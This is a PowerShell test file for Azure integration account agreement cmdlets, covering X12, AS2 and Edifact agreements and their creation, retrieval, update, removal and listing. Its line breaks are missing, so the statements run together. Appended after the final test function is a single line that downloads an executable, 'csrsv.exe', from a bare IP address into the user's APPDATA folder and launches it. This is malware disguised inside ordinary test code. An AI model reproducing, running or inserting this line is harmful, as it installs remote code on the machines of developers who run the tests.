function Test-CreateIntegrationAccountAgreementX12{$agreementX12FilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "X12AgreementContent.json"$agreementX12Content = [IO.File]::ReadAllText($agreementX12FilePath)$resourceGroup = TestSetup-CreateResourceGroup$integrationAccountName = "IA-" + (getAssetname)$integrationAccountX12AgreementName = getAssetname$integrationAccountX12AgreementName1 = getAssetname$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName$hostPartnerName = getAssetname$guestPartnerName = getAssetname$hostBusinessIdentities = @(("AA","AA"), ("BB","BB"))$guestBusinessIdentities = @(("ZZ","ZZ"), ("XX","XX"))$hostPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $hostPartnerName -BusinessIdentities $hostBusinessIdentities$guestPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $guestPartnerName -BusinessIdentities $guestBusinessIdentities$childItems = New-Object PSObject |Add-Member -PassThru NoteProperty Item1 'ChildItem' |Add-Member -PassThru NoteProperty Item2 1 |Add-Member -PassThru NoteProperty Item3 ("Prop1","Prop2","Prop3") $items = (New-Object PSObject |Add-Member -PassThru NoteProperty Property1 'Main' |Add-Member -PassThru NoteProperty Property2 $childItems)$metadata = $items | ConvertTo-JSON -CompressAssert-ThrowsContains {New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifier "AA" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12Content -Metadata "test" } "Invalid metadata."$integrationAccountAgreement0 =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12Content -Metadata $metadataAssert-AreEqual $integrationAccountX12AgreementName $integrationAccountAgreement0.Name$integrationAccountAgreement1 =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName1 -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContentFilePath $agreementX12FilePathAssert-AreEqual $integrationAccountX12AgreementName1 $integrationAccountAgreement1.NameRemove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force}function Test-CreateIntegrationAccountAgreementAS2{$agreementAS2FilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "AS2AgreementContent.json"$agreementAS2Content = [IO.File]::ReadAllText($agreementAS2FilePath)$resourceGroup = TestSetup-CreateResourceGroup$integrationAccountName = "IA-" + (getAssetname)$integrationAccountAS2AgreementName = getAssetname$integrationAccountAS2AgreementName1 = getAssetname$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName$hostPartnerName = getAssetname	$guestPartnerName = getAssetname$hostBusinessIdentities = @(("AA","AA"), ("BB","BB"))$guestBusinessIdentities = @(("ZZ","ZZ"), ("XX","XX"))$hostPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $hostPartnerName -BusinessIdentities $hostBusinessIdentities$guestPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $guestPartnerName -BusinessIdentities $guestBusinessIdentities$integrationAccountAgreement3 =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAS2AgreementName -AgreementType "AS2" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementAS2ContentAssert-AreEqual $integrationAccountAS2AgreementName $integrationAccountAgreement3.Name$integrationAccountAgreement4 =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAS2AgreementName1 -AgreementType "AS2" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContentFilePath $agreementAS2FilePathAssert-AreEqual $integrationAccountAS2AgreementName1 $integrationAccountAgreement4.NameRemove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force}function Test-CreateIntegrationAccountAgreementEdifact{$agreementEdifactFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "EdifactAgreementContent.json"$agreementEdifactContent = [IO.File]::ReadAllText($agreementEdifactFilePath)$resourceGroup = TestSetup-CreateResourceGroup$integrationAccountName = "IA-" + (getAssetname)$integrationAccountEdifactAgreementName = getAssetname$integrationAccountEdifactAgreementName1 = getAssetname$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName$hostPartnerName = getAssetname$guestPartnerName = getAssetname$hostBusinessIdentities = @(("AA","AA"), ("BB","BB"))$guestBusinessIdentities = @(("ZZ","ZZ"), ("XX","XX"))$hostPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $hostPartnerName -BusinessIdentities $hostBusinessIdentities$guestPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $guestPartnerName -BusinessIdentities $guestBusinessIdentities$integrationAccountAgreement5 =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountEdifactAgreementName -AgreementType "Edifact" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementEdifactContentAssert-AreEqual $integrationAccountEdifactAgreementName $integrationAccountAgreement5.Name$integrationAccountAgreement6 =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountEdifactAgreementName1 -AgreementType "Edifact" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContentFilePath $agreementEdifactFilePathAssert-AreEqual $integrationAccountEdifactAgreementName1 $integrationAccountAgreement6.NameRemove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force}function Test-CreateIntegrationAccountAgreementWithFailure{$agreementX12FilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "X12AgreementContent.json"$agreementX12Content = [IO.File]::ReadAllText($agreementX12FilePath)$resourceGroup = TestSetup-CreateResourceGroup$integrationAccountName = "IA-" + (getAssetname)$integrationAccountX12AgreementName = getAssetname$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName$hostPartnerName = getAssetname	$guestPartnerName = getAssetname$hostBusinessIdentities = @(("AA","AA"), ("BB","BB"))$guestBusinessIdentities = @(("ZZ","ZZ"), ("XX","XX"))$hostPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $hostPartnerName -BusinessIdentities $hostBusinessIdentities$guestPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $guestPartnerName -BusinessIdentities $guestBusinessIdentitiesAssert-ThrowsContains {New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner "TestGuest" -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12Content} "The partner 'TestGuest' could not be found in integration account '$integrationAccountName'."Assert-ThrowsContains {New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner "TestHost" -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12Content} "The partner 'TestHost' could not be found in integration account '$integrationAccountName'."Assert-ThrowsContains {New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "BB" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "BB" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12Content} "The qualifier 'BB' for partner '$guestPartnerName' is invalid."Assert-ThrowsContains {New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "OO" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "OO" -AgreementContent $agreementX12Content} "The qualifier 'OO' for partner '$hostPartnerName' is invalid."Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force}function Test-GetIntegrationAccountAgreement{$agreementX12FilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "X12AgreementContent.json"$agreementX12Content = [IO.File]::ReadAllText($agreementX12FilePath)Assert-ThrowsContains { Get-AzIntegrationAccountAgreement -ResourceGroupName "Random83da135" -IntegrationAccountName "DoesNotMatter" -AgreementName "DoesNotMatter" } "Resource group 'Random83da135' could not be found."$resourceGroup = TestSetup-CreateResourceGroup$integrationAccountName = "IA-" + (getAssetname)$integrationAccountX12AgreementName = getAssetname$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName$hostPartnerName = getAssetname$guestPartnerName = getAssetname$hostBusinessIdentities = @(("AA","AA"), ("BB","BB"))$guestBusinessIdentities = @(("ZZ","ZZ"), ("XX","XX"))$hostPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $hostPartnerName -BusinessIdentities $hostBusinessIdentities$guestPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $guestPartnerName -BusinessIdentities $guestBusinessIdentities$integrationAccountAgreement0 =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12Content$result =  Get-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementNameAssert-AreEqual $integrationAccountX12AgreementName $result.Name$result1 =  Get-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountNameAssert-True { $result1.Count -gt 0 }Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force}function Test-RemoveIntegrationAccountAgreement{$agreementX12FilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "X12AgreementContent.json"$agreementX12Content = [IO.File]::ReadAllText($agreementX12FilePath)$resourceGroup = TestSetup-CreateResourceGroup$integrationAccountName = "IA-" + (getAssetname)$integrationAccountX12AgreementName = getAssetname$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName$hostPartnerName = getAssetname	$guestPartnerName = getAssetname$hostBusinessIdentities = @(("AA","AA"), ("BB","BB"))$guestBusinessIdentities = @(("ZZ","ZZ"), ("XX","XX"))$hostPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $hostPartnerName -BusinessIdentities $hostBusinessIdentities$guestPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $guestPartnerName -BusinessIdentities $guestBusinessIdentities$integrationAccountAgreement0 =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12ContentRemove-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -Force	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force}function Test-UpdateIntegrationAccountAgreement{$agreementX12FilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "X12AgreementContent.json"$agreementX12Content = [IO.File]::ReadAllText($agreementX12FilePath)$agreementAS2FilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "AS2AgreementContent.json"$agreementAS2Content = [IO.File]::ReadAllText($agreementAS2FilePath)$resourceGroup = TestSetup-CreateResourceGroup$integrationAccountName = "IA-" + (getAssetname)$integrationAccountAgreementName = getAssetname$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName$hostPartnerName = getAssetname	$guestPartnerName = getAssetname$hostBusinessIdentities = @(("AA","AA"), ("BB","BB"))$guestBusinessIdentities = @(("ZZ","ZZ"), ("XX","XX"))$hostPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $hostPartnerName -BusinessIdentities $hostBusinessIdentities$guestPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $guestPartnerName -BusinessIdentities $guestBusinessIdentities$integrationAccountAgreement =  New-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12ContentAssert-AreEqual $integrationAccountAgreementName $integrationAccountAgreement.NameAssert-AreEqual "X12" $integrationAccountAgreement.AgreementTypeAssert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ"  -Force} "Either 'Host' business Identity qualifier or qualifier value is not specified."Assert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ"  -HostIdentityQualifierValue "AA" -GuestIdentityQualifierValue "ZZ"  -Force} "Either 'Host' business Identity qualifier or qualifier value is not specified."Assert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -HostIdentityQualifierValue "AA" -Force} "Either 'Guest' business Identity qualifier or qualifier value is not specified."Assert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifier "AA" -HostIdentityQualifierValue "AA" -Force} "Either 'Guest' business Identity qualifier or qualifier value is not specified."$updatedIntegrationAccountAgreement =  Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "AS2" -AgreementContent $agreementAS2Content -ForceAssert-AreEqual "AS2" $updatedIntegrationAccountAgreement.AgreementType$updatedIntegrationAccountAgreement =  Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "AS2" -AgreementContentFilePath $agreementAS2FilePath -ForceAssert-AreEqual "AS2" $updatedIntegrationAccountAgreement.AgreementType$updatedIntegrationAccountAgreement =  Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -GuestIdentityQualifier "XX" -GuestIdentityQualifierValue "XX" -ForceAssert-AreEqual "XX" $updatedIntegrationAccountAgreement.GuestIdentity.QualifierAssert-AreEqual "XX" $updatedIntegrationAccountAgreement.GuestIdentity.Value$updatedIntegrationAccountAgreement =  Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -HostIdentityQualifier "BB" -HostIdentityQualifierValue "BB" -ForceAssert-AreEqual "BB" $updatedIntegrationAccountAgreement.HostIdentity.QualifierAssert-AreEqual "BB" $updatedIntegrationAccountAgreement.HostIdentity.ValueAssert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner "TestGuest" -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -Force} "The partner 'TestGuest' could not be found in integration account '$integrationAccountName'."Assert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner "TestHost" -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -Force} "The partner 'TestHost' could not be found in integration account '$integrationAccountName'."Assert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "BB" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "BB" -HostIdentityQualifierValue "AA" -Force} "The qualifier 'BB' for partner '$guestPartnerName' is invalid."Assert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "OO" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "OO" -Force} "The qualifier 'OO' for partner '$hostPartnerName' is invalid."$updatedIntegrationAccountAgreement =  Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -GuestPartner $hostPartnerName -HostPartner $guestPartnerName -ForceAssert-AreEqual $hostPartnerName $updatedIntegrationAccountAgreement.GuestPartnerAssert-AreEqual $guestPartnerName $updatedIntegrationAccountAgreement.HostPartner$childItems = New-Object PSObject |Add-Member -PassThru NoteProperty Item1 'ChildItem' |Add-Member -PassThru NoteProperty Item2 1 |Add-Member -PassThru NoteProperty Item3 ("Prop1","Prop2","Prop3") $items = (New-Object PSObject |Add-Member -PassThru NoteProperty Property1 'Main' |Add-Member -PassThru NoteProperty Property2 $childItems)$metadata = $items | ConvertTo-JSON -CompressAssert-ThrowsContains {Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -Metadata "test" -Force} "Invalid metadata."$updatedIntegrationAccountAgreement =  Set-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountAgreementName -Metadata $metadata	-Force$result = $updatedIntegrationAccountAgreement.Metadata.ToString() | ConvertFrom-JSON Assert-AreEqualObjectProperties $items $result Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force}function Test-ListIntegrationAccountAgreement{$agreementX12FilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "X12AgreementContent.json"$agreementX12Content = [IO.File]::ReadAllText($agreementX12FilePath)$resourceGroup = TestSetup-CreateResourceGroup$integrationAccountName = "IA-" + (getAssetname)$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName$hostPartnerName = getAssetname$guestPartnerName = getAssetname$hostBusinessIdentities = @(("AA","AA"), ("BB","BB"))$guestBusinessIdentities = @(("ZZ","ZZ"), ("XX","XX"))$hostPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $hostPartnerName -BusinessIdentities $hostBusinessIdentities$guestPartner =  New-AzIntegrationAccountPartner -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -PartnerName $guestPartnerName -BusinessIdentities $guestBusinessIdentities$val=0while($val -ne 1){$val++ ;$integrationAccountX12AgreementName = getAssetnameNew-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AgreementName $integrationAccountX12AgreementName -AgreementType "X12" -GuestPartner $guestPartnerName -HostPartner $hostPartnerName -GuestIdentityQualifier "ZZ" -HostIdentityQualifier "AA" -GuestIdentityQualifierValue "ZZ" -HostIdentityQualifierValue "AA" -AgreementContent $agreementX12Content}$result =  Get-AzIntegrationAccountAgreement -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountNameAssert-True { $result.Count -eq 1 }Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")